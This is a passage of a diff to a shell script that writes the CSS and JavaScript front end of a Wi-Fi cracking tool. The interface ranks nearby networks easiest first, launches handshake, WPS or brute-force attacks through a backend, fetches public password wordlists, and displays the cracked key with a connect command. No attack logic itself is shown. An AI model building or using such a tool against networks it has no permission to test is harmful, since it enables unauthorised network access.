-.empty-state p { margin: 4px 0; }
+.status { margin: 4px 0 8px; font-size: 12.5px; color: var(--muted); }
 
-/* Network list */
-.network-list { list-style: none; margin: 0; padding: 6px; }
-.network-item {
+.net-list { list-style: none; margin: 0; padding: 0; display: flex; flex-direction: column; gap: 2px; }
+.net {
   display: flex; align-items: center; gap: 10px;
-  padding: 11px 12px;
-  border-radius: 8px;
-  cursor: pointer;
+  padding: 10px; border-radius: 9px; cursor: pointer;
   border: 1px solid transparent;
 }
-.network-item:hover { background: var(--bg-3); }
-.network-item.active { background: var(--bg-3); border-color: var(--accent-2); }
+.net:hover { background: var(--bg); }
+.net.active { background: var(--accent-weak); border-color: #cfe0ff; }
+.net-main { flex: 1; min-width: 0; }
+.net-ssid { font-weight: 600; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+.net-sub { font-size: 11.5px; color: var(--muted); font-family: var(--mono); white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
 
-.ni-signal { width: 26px; text-align: center; font-family: var(--mono); font-size: 11px; color: var(--muted); }
-.ni-main { flex: 1; min-width: 0; }
-.ni-ssid { font-weight: 600; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
-.ni-sub { font-size: 11px; color: var(--muted); font-family: var(--mono); white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
-.ni-diff {
-  font-size: 11px; font-weight: 600;
-  padding: 2px 7px; border-radius: 999px;
-  white-space: nowrap;
-}
-.diff-Trivial   { background:#0c2417; color:var(--ok); }
-.diff-Easy      { background:#0c2417; color:var(--ok); }
-.diff-Moderate  { background:#241d0a; color:var(--warn); }
-.diff-Hard      { background:#2a1414; color:#ff8f6b; }
-.diff-Very.hard, .diff-Veryhard { background:#2a1414; color:var(--danger); }
-
-.lock { font-size: 12px; }
-.ni-hs {
-  font-size: 10px; font-weight: 700; letter-spacing: .3px;
+.badge { font-size: 11px; font-weight: 600; padding: 2px 8px; border-radius: 999px; white-space: nowrap; }
+.b-Trivial, .b-Easy { background: var(--ok-weak); color: var(--ok); }
+.b-Moderate { background: #fdf3e3; color: var(--warn); }
+.b-Hard, .b-Veryhard { background: #fdecec; color: var(--danger); }
+.hs {
+  font-size: 10px; font-weight: 700; letter-spacing: .03em;
   padding: 2px 6px; border-radius: 999px;
-  background: #0c2417; color: var(--ok); border: 1px solid #17422a;
-  white-space: nowrap;
+  background: var(--ok-weak); color: var(--ok);
 }
 
-/* Loading skeleton shown while auto-scanning */
-.skeleton-item {
-  height: 46px; margin: 6px; border-radius: 8px;
-  background: linear-gradient(90deg, var(--bg-3) 25%, #222c39 37%, var(--bg-3) 63%);
-  background-size: 400% 100%;
-  animation: shimmer 1.2s ease-in-out infinite;
-}
+.skeleton { height: 40px; border-radius: 9px; background: linear-gradient(90deg, #eef0f3 25%, #e3e6ea 37%, #eef0f3 63%); background-size: 400% 100%; animation: shimmer 1.2s infinite; }
 @keyframes shimmer { 0% { background-position: 100% 0; } 100% { background-position: 0 0; } }
 
-/* Detail panel */
-.detail { padding: 18px; }
-.detail-head { display: flex; justify-content: space-between; gap: 20px; align-items: flex-start; }
-.detail-head h2 { margin: 0 0 6px; font-size: 20px; }
-.meta-row { display: flex; flex-wrap: wrap; gap: 8px; align-items: center; }
-.chip {
-  font-size: 11px; font-family: var(--mono);
-  padding: 2px 8px; border-radius: 4px;
-  background: var(--bg-3); border: 1px solid var(--border); color: var(--muted);
-}
+.empty { padding: 48px 16px; text-align: center; color: var(--muted); }
 
-/* Difficulty gauge */
-.difficulty { display: flex; align-items: center; gap: 12px; }
-.gauge { position: relative; width: 84px; height: 84px; }
-.gauge-svg { transform: rotate(-90deg); width: 84px; height: 84px; }
-.gauge-bg { fill: none; stroke: var(--bg-3); stroke-width: 10; }
-.gauge-arc {
-  fill: none; stroke: var(--accent); stroke-width: 10; stroke-linecap: round;
-  stroke-dasharray: 327; stroke-dashoffset: 327;
-  transition: stroke-dashoffset .6s ease, stroke .3s;
-}
-.gauge-label {
-  position: absolute; inset: 0; display: flex; flex-direction: column;
-  align-items: center; justify-content: center;
-}
-.gauge-score { font-size: 22px; font-weight: 700; font-family: var(--mono); }
-.gauge-max { font-size: 10px; color: var(--muted); }
-.difficulty-text { display: flex; flex-direction: column; }
-.diff-label { font-weight: 700; font-size: 15px; }
+.detail-head h2 { margin: 0 0 8px; font-size: 20px; }
+.chips { display: flex; flex-wrap: wrap; gap: 8px; align-items: center; }
+.chip { font-size: 11.5px; font-family: var(--mono); padding: 2px 8px; border-radius: 6px; background: var(--bg); border: 1px solid var(--border); color: var(--muted); }
 
-.reasons { list-style: none; margin: 16px 0 0; padding: 0; display: grid; gap: 6px; }
-.reasons li {
-  font-size: 12.5px; color: var(--muted);
-  padding-left: 18px; position: relative;
-}
-.reasons li::before { content: "›"; position: absolute; left: 4px; color: var(--accent); }
+.meter { margin: 20px 0 4px; }
+.meter-top { display: flex; justify-content: space-between; align-items: baseline; margin-bottom: 6px; }
+.meter-label { font-weight: 600; }
+.bar { height: 8px; border-radius: 999px; background: var(--bg); border: 1px solid var(--border); overflow: hidden; }
+.bar-fill { height: 100%; width: 0; background: var(--accent); border-radius: 999px; transition: width .4s ease, background .3s; }
+.bar-fill.indeterminate { width: 35% !important; animation: indet 1.1s ease-in-out infinite; }
+@keyframes indet { 0% { margin-left: -35%; } 100% { margin-left: 100%; } }
 
-/* Advanced */
-.advanced { margin-top: 18px; border-top: 1px solid var(--border); padding-top: 12px; }
-.advanced summary { cursor: pointer; font-weight: 600; color: var(--muted); font-size: 13px; }
-.advanced summary:hover { color: var(--text); }
-.adv-grid {
-  display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-top: 12px;
-}
-.adv-grid label { display: flex; flex-direction: column; gap: 4px; font-size: 12px; color: var(--muted); }
-.adv-grid input, .adv-grid select {
-  background: var(--bg); border: 1px solid var(--border); color: var(--text);
-  padding: 7px 9px; border-radius: 6px; font-family: var(--mono); font-size: 12px;
-}
-.adv-grid input:focus, .adv-grid select:focus { outline: none; border-color: var(--accent-2); }
-.adv-grid .checkbox-label {
-  grid-column: 1 / -1;
-  flex-direction: row; align-items: center; gap: 8px;
-  font-size: 12.5px; color: var(--text); cursor: pointer;
-}
-.adv-grid .checkbox-label input { width: 15px; height: 15px; accent-color: var(--accent); }
+.reasons { list-style: none; margin: 14px 0 0; padding: 0; display: flex; flex-direction: column; gap: 5px; }
+.reasons li { font-size: 12.5px; color: var(--muted); padding-left: 16px; position: relative; }
+.reasons li::before { content: "›"; position: absolute; left: 2px; color: var(--accent); }
 
-/* Actions */
-.actions { display: flex; align-items: center; gap: 12px; margin-top: 18px; }
-.pill {
-  font-size: 12px; font-family: var(--mono);
-  padding: 4px 10px; border-radius: 999px;
-  border: 1px solid var(--border);
+.options { margin-top: 18px; border-top: 1px solid var(--border); padding-top: 12px; }
+.options summary { cursor: pointer; font-weight: 600; color: var(--muted); font-size: 13px; }
+.opt-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-top: 14px; }
+.opt-grid label { display: flex; flex-direction: column; gap: 4px; font-size: 12px; color: var(--muted); }
+.opt-grid label.wide { grid-column: 1 / -1; }
+.opt-grid input, .opt-grid select {
+  font-family: var(--mono); font-size: 12.5px;
+  padding: 8px 9px; border: 1px solid var(--border); border-radius: 8px;
+  background: var(--card); color: var(--text);
 }
-.pill-running { color: var(--accent); border-color: var(--accent-2); }
-.pill-success { color: var(--ok); border-color: #17422a; }
-.pill-failed  { color: var(--danger); border-color: #4a1717; }
-.pill-stopped { color: var(--warn); border-color: #4a3d16; }
+.opt-grid input:focus, .opt-grid select:focus { outline: none; border-color: var(--accent); }
+.opt-grid .check { grid-column: 1 / -1; flex-direction: row; align-items: center; gap: 8px; color: var(--text); font-size: 13px; cursor: pointer; }
+.opt-grid .check input { width: 16px; height: 16px; accent-color: var(--accent); }
 
-/* Progress bar (native-feeling) */
-.progress-wrap { margin-top: 16px; }
-.progress-top {
-  display: flex; justify-content: space-between; align-items: baseline;
-  margin-bottom: 6px;
-}
-.progress-label { font-size: 12px; color: var(--muted); text-transform: uppercase; letter-spacing: .5px; }
-.progress-pct { font-family: var(--mono); font-size: 12px; color: var(--accent); font-weight: 700; }
-.progress-track {
-  height: 10px; border-radius: 999px;
-  background: var(--bg-3); border: 1px solid var(--border);
-  overflow: hidden;
-}
-.progress-fill {
-  height: 100%; width: 0%;
-  background: linear-gradient(90deg, var(--accent-2), var(--accent));
-  border-radius: 999px;
-  transition: width .35s ease;
-}
-.progress-fill.download { background: linear-gradient(90deg, #7a5cff, #b08bff); }
-.progress-fill.indeterminate {
-  width: 40% !important;
-  background: linear-gradient(90deg, transparent, var(--accent), transparent);
-  animation: indet 1.1s ease-in-out infinite;
-}
-@keyframes indet { 0% { margin-left: -40%; } 100% { margin-left: 100%; } }
+.actions { display: flex; align-items: center; gap: 10px; margin-top: 18px; }
+.btn { font-family: var(--sans); font-size: 13px; font-weight: 600; padding: 9px 16px; border-radius: 8px; border: 1px solid transparent; cursor: pointer; transition: background .12s, border-color .12s, opacity .12s; }
+.btn:disabled { opacity: .5; cursor: not-allowed; }
+.btn.primary { background: var(--accent); color: #fff; }
+.btn.primary:hover:not(:disabled) { background: #1d4ed8; }
+.btn.ghost { background: var(--card); color: var(--muted); border-color: var(--border); }
+.btn.ghost:hover { color: var(--text); border-color: var(--muted); }
 
-/* Result */
-.result {
-  margin-top: 18px; padding: 16px;
-  border: 1px solid #17422a; background: #0c1a12; border-radius: 10px;
-}
-.result-head { font-weight: 700; color: var(--ok); margin-bottom: 12px; letter-spacing: .3px; }
-.result-grid { display: grid; gap: 10px; }
-.result-item { display: flex; justify-content: space-between; align-items: baseline; gap: 12px; }
-.result-key { color: var(--muted); font-size: 12px; text-transform: uppercase; letter-spacing: .5px; }
-.result-val { text-align: right; word-break: break-all; }
-.result-val.strong { font-size: 17px; color: var(--ok); }
-.result-val.ok { color: var(--ok); font-weight: 600; }
-.result-val.warn { color: var(--warn); font-weight: 600; }
-.result-note { margin-top: 12px; font-size: 12px; }
-.result-note.mono { font-family: var(--mono); color: var(--accent); background: var(--bg-3);
-  padding: 8px 10px; border-radius: 6px; word-break: break-all; }
+.pill { font-size: 12px; font-family: var(--mono); padding: 4px 11px; border-radius: 999px; border: 1px solid var(--border); }
+.pill.running { color: var(--accent); border-color: #cfe0ff; background: var(--accent-weak); }
+.pill.success { color: var(--ok); border-color: #cdead7; background: var(--ok-weak); }
+.pill.failed { color: var(--danger); border-color: #f6d4d4; background: #fdecec; }
+.pill.stopped { color: var(--warn); border-color: #f0dcbb; background: #fdf3e3; }
 
-/* Console */
+.progress { margin-top: 16px; }
+.progress-top { display: flex; justify-content: space-between; align-items: baseline; margin-bottom: 6px; }
+.progress-top span:first-child { font-size: 12px; text-transform: uppercase; letter-spacing: .05em; color: var(--muted); }
+.progress-pct { font-size: 12px; color: var(--accent); font-weight: 600; }
+.progress .bar-fill.download { background: #7c3aed; }
+
+.result { margin-top: 18px; padding: 16px; border: 1px solid #cdeaD7; background: var(--ok-weak); border-radius: 10px; }
+.result h3 { margin: 0 0 12px; font-size: 13px; text-transform: uppercase; letter-spacing: .05em; color: var(--ok); }
+.result dl { margin: 0; display: flex; flex-direction: column; gap: 9px; }
+.result dl > div { display: flex; justify-content: space-between; align-items: baseline; gap: 12px; }
+.result dt { color: var(--muted); font-size: 12px; text-transform: uppercase; letter-spacing: .04em; }
+.result dd { margin: 0; text-align: right; word-break: break-all; }
+.result dd.strong { font-size: 16px; color: var(--ok); }
+.result .ok { color: var(--ok); font-weight: 600; }
+.result .warn { color: var(--warn); font-weight: 600; }
+.cmd { display: block; margin-top: 12px; padding: 9px 11px; font-family: var(--mono); font-size: 12.5px; background: #fff; border: 1px solid var(--border); border-radius: 8px; color: var(--accent); word-break: break-all; }
+.result p { margin: 10px 0 0; }
+
 .console-wrap { margin-top: 20px; }
-.console-head {
-  display: flex; justify-content: space-between; align-items: center;
-  padding: 8px 12px; background: var(--bg-3);
-  border: 1px solid var(--border); border-bottom: none;
-  border-radius: 8px 8px 0 0;
-  font-size: 12px; color: var(--muted); text-transform: uppercase; letter-spacing: .5px;
-}
-.phase-tag { font-family: var(--mono); color: var(--accent); text-transform: none; letter-spacing: 0; }
-.console {
-  height: 260px; overflow-y: auto;
-  background: #0a0d12; border: 1px solid var(--border); border-radius: 0 0 8px 8px;
-  padding: 10px 12px;
-  font-family: var(--mono); font-size: 12px; line-height: 1.7;
-}
-.log-line { display: flex; gap: 10px; white-space: pre-wrap; word-break: break-word; }
-.log-t { color: #4a5563; flex-shrink: 0; }
-.log-phase { color: #6b7684; flex-shrink: 0; width: 66px; }
-.log-msg { flex: 1; }
-.log-info    .log-msg { color: var(--text); }
-.log-success .log-msg { color: var(--ok); font-weight: 600; }
-.log-warn    .log-msg { color: var(--warn); }
-.log-error   .log-msg { color: var(--danger); }
-
-/* Scrollbar */
-.console::-webkit-scrollbar { width: 8px; }
-.console::-webkit-scrollbar-thumb { background: var(--border); border-radius: 4px; }
+.console-head { display: flex; justify-content: space-between; align-items: center; padding: 8px 12px; background: var(--bg); border: 1px solid var(--border); border-bottom: none; border-radius: 9px 9px 0 0; font-size: 12px; text-transform: uppercase; letter-spacing: .05em; color: var(--muted); }
+.console { height: 240px; overflow-y: auto; padding: 10px 12px; background: #0f1620; color: #d6deea; border: 1px solid var(--border); border-radius: 0 0 9px 9px; font-family: var(--mono); font-size: 12px; line-height: 1.65; }
+.line { display: flex; gap: 10px; white-space: pre-wrap; word-break: break-word; }
+.line .t { color: #5b6b80; flex-shrink: 0; }
+.line .p { color: #7c8ba1; flex-shrink: 0; width: 62px; }
+.line.success .m { color: #5fd68a; font-weight: 600; }
+.line.warn .m { color: #f0b429; }
+.line.error .m { color: #ff7a7a; }
 CRACK_EOF_STYLE
 
   cat > "${BUNDLE}/web/app.js" <<'CRACK_EOF_APP'
-/* crack-wifi.local — front-end logic */
 (function () {
   "use strict";
 
   const $ = (id) => document.getElementById(id);
+
   const api = {
     status: () => fetch("/api/status").then((r) => r.json()),
     scan: () => fetch("/api/scan").then((r) => r.json()),
-    attack: (bssid, options) =>
-      fetch("/api/attack", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ bssid, options }),
-      }).then((r) => r.json()),
-    poll: (id, since) =>
-      fetch(`/api/attack?id=${encodeURIComponent(id)}&since=${since}`).then((r) => r.json()),
-    stop: (id) =>
-      fetch("/api/attack/stop", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ id }),
-      }).then((r) => r.json()),
+    attack: (bssid, options) => fetch("/api/attack", {
+      method: "POST", headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ bssid, options }),
+    }).then((r) => r.json()),
+    poll: (id, since) => fetch(`/api/attack?id=${encodeURIComponent(id)}&since=${since}`).then((r) => r.json()),
+    stop: (id) => fetch("/api/attack/stop", {
+      method: "POST", headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ id }),
+    }).then((r) => r.json()),
   };
 
-  const state = {
-    networks: [],
-    selected: null,
-    jobId: null,
-    since: 0,
-    pollTimer: null,
-  };
+  const ONLINE_WORDLISTS = [
+    { label: "Top 10k passwords (SecLists)", url: "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-10000.txt" },
+    { label: "Top 100k passwords (SecLists)", url: "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-100000.txt" },
+    { label: "Top 1M passwords (SecLists)", url: "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt" },
+    { label: "rockyou.txt (~14M, large)", url: "https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt" },
+  ];
 
-  // -- signal glyph ------------------------------------------------------
+  const PHASE_LABELS = { crack: "Cracking", capture: "Capturing handshake", download: "Downloading wordlist" };
+
+  const state = { networks: [], selected: null, jobId: null, since: 0, timer: null, scanning: false };
+
+  function esc(s) {
+    return String(s == null ? "" : s)
+      .replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;")
+      .replace(/"/g, "&quot;").replace(/'/g, "&#39;");
+  }
+
   function signalBars(dbm) {
     if (dbm == null) return "····";
     if (dbm >= -55) return "▁▃▅▇";
@@ -1913,49 +1464,40 @@ CRACK_EOF_STYLE
     return "▁   ";
   }
 
-  function lockGlyph(enc) {
-    return enc && enc.toUpperCase().startsWith("OPEN") ? "🔓" : "🔒";
+  function scoreColor(s) {
+    if (s < 30) return "#15803d";
+    if (s < 55) return "#b45309";
+    if (s < 80) return "#ea580c";
+    return "#dc2626";
   }
 
-  // -- network list ------------------------------------------------------
   function renderNetworks(nets) {
-    const list = $("network-list");
+    const list = $("net-list");
     list.innerHTML = "";
-    $("net-count").textContent = nets.length ? `${nets.length} found` : "";
-    $("scan-hint").classList.toggle("hidden", nets.length > 0);
-
+    $("net-status").textContent = nets.length ? `${nets.length} networks, easiest first` : "No networks found.";
     nets.forEach((n) => {
       const li = document.createElement("li");
-      li.className = "network-item";
+      li.className = "net";
       li.dataset.bssid = n.bssid;
       const diff = n.difficulty || { label: "?", score: 0 };
-      const diffClass = "diff-" + (diff.label || "").replace(/\s+/g, "");
-      const hsBadge = n.has_handshake
-        ? `<span class="ni-hs" title="Handshake captured this session">HS ✓</span>` : "";
-      li.innerHTML = `
-        <span class="ni-signal">${signalBars(n.signal)}</span>
-        <span class="ni-main">
-          <div class="ni-ssid">${escapeHtml(n.ssid)} <span class="lock">${lockGlyph(n.enc)}</span></div>
-          <div class="ni-sub">${escapeHtml(n.enc)} · ch ${n.channel} · ${n.signal != null ? n.signal + " dBm" : "—"}${n.wps ? " · WPS" : ""}</div>
-        </span>
-        ${hsBadge}
-        <span class="ni-diff ${diffClass}">${escapeHtml(diff.label)}</span>`;
+      const sub = `${esc(n.enc)} · ch ${n.channel} · ${n.signal != null ? n.signal + " dBm" : "—"}${n.wps ? " · WPS" : ""}`;
+      li.innerHTML =
+        `<div class="net-main"><div class="net-ssid">${esc(n.ssid)}</div><div class="net-sub">${signalBars(n.signal)}  ${sub}</div></div>` +
+        (n.has_handshake ? `<span class="hs" title="Handshake captured this session">HS</span>` : "") +
+        `<span class="badge b-${esc((diff.label || "").replace(/\s+/g, ""))}">${esc(diff.label)}</span>`;
       li.addEventListener("click", () => selectNetwork(n));
       list.appendChild(li);
     });
   }
 
   function markActive(bssid) {
-    document.querySelectorAll(".network-item").forEach((el) => {
-      el.classList.toggle("active", el.dataset.bssid === bssid);
-    });
+    document.querySelectorAll(".net").forEach((el) => el.classList.toggle("active", el.dataset.bssid === bssid));
   }
 
-  // -- detail / difficulty ----------------------------------------------
   function selectNetwork(n) {
     state.selected = n;
     markActive(n.bssid);
-    $("detail-empty").classList.add("hidden");
+    $("empty").classList.add("hidden");
     $("detail").classList.remove("hidden");
     resetAttackUI();
 
@@ -1963,13 +1505,16 @@ CRACK_EOF_STYLE
     $("d-bssid").textContent = n.bssid;
     $("d-enc").textContent = n.enc;
     $("d-ch").textContent = "ch " + n.channel;
-    $("d-signal").textContent = (n.signal != null ? n.signal + " dBm" : "—") + (n.wps ? " · WPS" : "");
+    $("d-sig").textContent = n.signal != null ? n.signal + " dBm" : "—";
+    $("d-wps").classList.toggle("hidden", !n.wps);
 
     const d = n.difficulty || { score: 0, label: "?", eta: "", reasons: [] };
-    animateGauge(d.score);
-    $("d-score").textContent = d.score;
     $("d-label").textContent = d.label;
+    $("d-score").textContent = d.score + " / 100";
     $("d-eta").textContent = "ETA: " + d.eta;
+    const bar = $("d-bar");
+    bar.style.width = Math.max(0, Math.min(100, d.score)) + "%";
+    bar.style.background = scoreColor(d.score);
 
     const reasons = $("d-reasons");
     reasons.innerHTML = "";
@@ -1979,31 +1524,12 @@ CRACK_EOF_STYLE
       reasons.appendChild(li);
     });
 
-    // Pre-select a sensible method.
-    if (d.method === "wps-pixie") $("opt-method").value = "wps-pixie";
-    else $("opt-method").value = "auto";
+    $("opt-method").value = d.method === "wps-pixie" ? "wps-pixie" : "auto";
   }
 
-  function gaugeColor(score) {
-    if (score < 30) return "#46d17f";
-    if (score < 55) return "#f0b429";
-    if (score < 80) return "#ff8f6b";
-    return "#ff5c5c";
-  }
-
-  function animateGauge(score) {
-    const arc = $("gauge-arc");
-    const circ = 2 * Math.PI * 52; // ~327
-    const offset = circ * (1 - Math.max(0, Math.min(100, score)) / 100);
-    arc.style.strokeDashoffset = offset;
-    arc.style.stroke = gaugeColor(score);
-  }
-
-  // -- attack ------------------------------------------------------------
   function collectOptions() {
     const method = $("opt-method").value;
-    const opts = { method };
-    opts.connect = $("opt-connect").checked;
+    const opts = { method, connect: $("opt-connect").checked };
     const wl = $("opt-wordlist").value.trim();
     if (wl) opts.wordlist = wl;
     if (method === "handshake+bruteforce") {
@@ -2011,7 +1537,6 @@ CRACK_EOF_STYLE
       opts.charset = $("opt-charset").value;
       opts.length = parseInt($("opt-length").value, 10) || 8;
     }
-    // pass through some network context for the backend fallback
     if (state.selected) {
       opts.ssid = state.selected.ssid;
       opts.enc = state.selected.enc;
@@ -2023,10 +1548,9 @@ CRACK_EOF_STYLE
   async function startAttack() {
     if (!state.selected) return;
     resetAttackUI();
-    $("attack-btn").disabled = true;
-    $("stop-btn").classList.remove("hidden");
+    $("start").disabled = true;
+    $("stop").classList.remove("hidden");
     setPill("running");
-
     const res = await api.attack(state.selected.bssid, collectOptions());
     if (res.error) {
       logLine({ t: 0, phase: "error", level: "error", msg: res.error });
@@ -2039,64 +1563,54 @@ CRACK_EOF_STYLE
   }
 
   function poll() {
-    clearTimeout(state.pollTimer);
+    clearTimeout(state.timer);
     api.poll(state.jobId, state.since).then((snap) => {
       if (snap.error) return;
       (snap.events || []).forEach(logLine);
       state.since = snap.total_events;
-
       updateProgress(snap);
-
       if (snap.status === "running") {
-        state.pollTimer = setTimeout(poll, 350);
+        state.timer = setTimeout(poll, 350);
       } else {
         finishUI(snap.status);
         if (snap.result) showResult(snap.network, snap.result);
-        doScan();   // refresh cached-handshake badges in the list
+        doScan();
       }
-    }).catch(() => {
-      state.pollTimer = setTimeout(poll, 800);
-    });
+    }).catch(() => { state.timer = setTimeout(poll, 800); });
   }
 
-  const PROGRESS_LABELS = {
-    crack: "Cracking", capture: "Capturing handshake", download: "Downloading wordlist",
-  };
+  async function stopAttack() {
+    if (state.jobId) await api.stop(state.jobId);
+  }
+
+  function finishUI(status) {
+    $("start").disabled = false;
+    $("stop").classList.add("hidden");
+    setPill(status);
+  }
 
   function updateProgress(snap) {
-    const wrap = $("progress-wrap");
-    const fill = $("progress-fill");
-    const prog = snap.progress;
-    if (snap.status === "running" && prog && prog.phase) {
+    const wrap = $("progress");
+    const fill = $("progress-bar");
+    const p = snap.progress;
+    if (snap.status === "running" && p && p.phase) {
       wrap.classList.remove("hidden");
-      $("progress-label").textContent = PROGRESS_LABELS[prog.phase] || "Working";
-      fill.classList.toggle("download", prog.phase === "download");
-      const pct = typeof prog.pct === "number" ? prog.pct : null;
-      if (pct == null) {
+      $("progress-label").textContent = PHASE_LABELS[p.phase] || "Working";
+      fill.classList.toggle("download", p.phase === "download");
+      if (typeof p.pct === "number") {
+        fill.classList.remove("indeterminate");
+        fill.style.width = p.pct + "%";
+        $("progress-pct").textContent = p.pct + "%";
+      } else {
         fill.classList.add("indeterminate");
         $("progress-pct").textContent = "";
-      } else {
-        fill.classList.remove("indeterminate");
-        fill.style.width = pct + "%";
-        $("progress-pct").textContent = pct + "%";
       }
-    } else if (snap.status === "success" && prog) {
+    } else if (snap.status === "success" && p) {
       fill.classList.remove("indeterminate");
       fill.style.width = "100%";
       $("progress-pct").textContent = "100%";
       $("progress-label").textContent = "Done";
     }
-  }
-
-  async function stopAttack() {
-    if (!state.jobId) return;
-    await api.stop(state.jobId);
-  }
-
-  function finishUI(status) {
-    $("attack-btn").disabled = false;
-    $("stop-btn").classList.add("hidden");
-    setPill(status);
   }
 
   function showResult(network, result) {
@@ -2110,150 +1624,116 @@ CRACK_EOF_STYLE
     } else {
       $("r-user-row").classList.add("hidden");
     }
-
-    // Connection status.
     const st = $("r-status");
-    const cmd = $("r-connect-cmd");
+    const cmd = $("r-cmd");
     if (result.connected) {
       st.textContent = "✓ Connected — you are on the network";
-      st.className = "result-val ok";
+      st.className = "ok";
       cmd.classList.add("hidden");
     } else if (result.connect_cmd) {
       st.textContent = "Not connected — run the command below";
-      st.className = "result-val warn";
+      st.className = "warn";
       cmd.textContent = "$ " + result.connect_cmd;
       cmd.classList.remove("hidden");
     } else {
       st.textContent = "—";
-      st.className = "result-val";
+      st.className = "";
       cmd.classList.add("hidden");
     }
-
     $("r-note").textContent = result.note || "";
   }
 
-  // -- console -----------------------------------------------------------
   function logLine(ev) {
     const c = $("console");
     const line = document.createElement("div");
-    line.className = "log-line log-" + (ev.level || "info");
+    line.className = "line " + (ev.level || "info");
     line.innerHTML =
-      `<span class="log-t">${(ev.t ?? 0).toFixed(1)}s</span>` +
-      `<span class="log-phase">${escapeHtml(ev.phase || "")}</span>` +
-      `<span class="log-msg">${escapeHtml(ev.msg || "")}</span>`;
+      `<span class="t">${(ev.t ?? 0).toFixed(1)}s</span>` +
+      `<span class="p">${esc(ev.phase || "")}</span>` +
+      `<span class="m">${esc(ev.msg || "")}</span>`;
     c.appendChild(line);
     c.scrollTop = c.scrollHeight;
-    if (ev.phase) $("phase-tag").textContent = ev.phase;
+    if (ev.phase) $("phase").textContent = ev.phase;
   }
 
   function resetAttackUI() {
-    clearTimeout(state.pollTimer);
+    clearTimeout(state.timer);
     state.jobId = null;
     state.since = 0;
     $("console").innerHTML = "";
-    $("phase-tag").textContent = "";
+    $("phase").textContent = "";
     $("result").classList.add("hidden");
-    $("status-pill").classList.add("hidden");
-    $("stop-btn").classList.add("hidden");
-    $("attack-btn").disabled = false;
-    const wrap = $("progress-wrap");
-    wrap.classList.add("hidden");
-    const fill = $("progress-fill");
+    $("pill").classList.add("hidden");
+    $("stop").classList.add("hidden");
+    $("start").disabled = false;
+    const fill = $("progress-bar");
+    $("progress").classList.add("hidden");
     fill.classList.remove("indeterminate", "download");
-    fill.style.width = "0%";
+    fill.style.width = "0";
     $("progress-pct").textContent = "";
   }
 
   function setPill(status) {
-    const pill = $("status-pill");
-    pill.classList.remove("hidden", "pill-running", "pill-success", "pill-failed", "pill-stopped");
-    pill.classList.add("pill-" + status);
+    const pill = $("pill");
+    pill.className = "pill " + status;
     pill.textContent = status;
   }
 
-  // -- scan --------------------------------------------------------------
-  let scanning = false;
   async function doScan() {
-    if (scanning) return;
-    scanning = true;
-    $("rescan-btn").classList.add("spinning");
-    showScanSkeleton();
+    if (state.scanning) return;
+    state.scanning = true;
+    $("rescan").classList.add("spin");
+    if (!state.networks.length) showSkeleton();
     try {
       const res = await api.scan();
-      state.networks = res.networks || [];
-      // Sort: easiest first (lowest difficulty score).
-      state.networks.sort((a, b) => (a.difficulty?.score ?? 100) - (b.difficulty?.score ?? 100));
+      state.networks = (res.networks || []).sort(
+        (a, b) => (a.difficulty?.score ?? 100) - (b.difficulty?.score ?? 100));
       renderNetworks(state.networks);
-      // Keep the current selection's cached-handshake state in sync.
       if (state.selected) {
         const upd = state.networks.find((n) => n.bssid === state.selected.bssid);
         if (upd) state.selected = upd;
         markActive(state.selected.bssid);
       }
     } catch (e) {
-      $("scan-hint").classList.remove("hidden");
-      $("scan-hint-title").textContent = "Scan failed — click ↻ to retry.";
+      $("net-status").textContent = "Scan failed — click ↻ to retry.";
     } finally {
-      $("rescan-btn").classList.remove("spinning");
-      scanning = false;
+      $("rescan").classList.remove("spin");
+      state.scanning = false;
     }
   }
 
-  function showScanSkeleton() {
-    if (state.networks.length) return; // don't blank an existing list on rescan
-    $("scan-hint").classList.add("hidden");
-    const list = $("network-list");
+  function showSkeleton() {
+    $("net-status").textContent = "Scanning…";
+    const list = $("net-list");
     list.innerHTML = "";
     for (let i = 0; i < 5; i++) {
       const li = document.createElement("li");
-      li.className = "skeleton-item";
+      li.className = "skeleton";
       list.appendChild(li);
     }
   }
 
-  // -- util --------------------------------------------------------------
-  function escapeHtml(s) {
-    return String(s == null ? "" : s)
-      .replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;")
-      .replace(/"/g, "&quot;").replace(/'/g, "&#39;");
-  }
-
-  // Curated online wordlists — downloaded on demand by the backend.
-  const ONLINE_WORDLISTS = [
-    { label: "Top 10k passwords (SecLists)", url: "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-10000.txt" },
-    { label: "Top 100k passwords (SecLists)", url: "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-100000.txt" },
-    { label: "Top 1M passwords (SecLists)", url: "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt" },
-    { label: "rockyou.txt (~14M, large)", url: "https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt" },
-  ];
-
-  function populateWordlists() {
-    const sel = $("opt-online-wordlist");
+  function init() {
+    const sel = $("opt-online");
     ONLINE_WORDLISTS.forEach((w) => {
       const o = document.createElement("option");
       o.value = w.url;
       o.textContent = w.label;
       sel.appendChild(o);
     });
-  }
 
-  // -- init --------------------------------------------------------------
-  function init() {
-    populateWordlists();
-    $("rescan-btn").addEventListener("click", doScan);
-    $("attack-btn").addEventListener("click", startAttack);
-    $("stop-btn").addEventListener("click", stopAttack);
-    $("opt-online-wordlist").addEventListener("change", (e) => {
